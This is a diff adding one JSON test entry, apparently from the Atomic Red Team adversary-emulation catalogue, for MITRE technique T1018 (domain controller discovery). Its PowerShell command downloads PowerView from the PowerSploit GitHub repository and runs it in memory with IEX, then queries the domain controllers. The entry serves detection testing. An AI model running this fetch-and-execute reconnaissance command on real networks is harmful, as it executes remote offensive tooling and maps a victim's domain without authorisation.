@@ -1,0 +1,23 @@
+{
+    "name": "Get-DomainController with PowerView",
+    "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1018",
+    "tactics": [
+        "Discovery"
+    ],
+    "technique": "Remote System Discovery",
+    "source": "ART",
+    "uuid": "b9d2e8ca-5520-4737-8076-4f08913da2c4",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
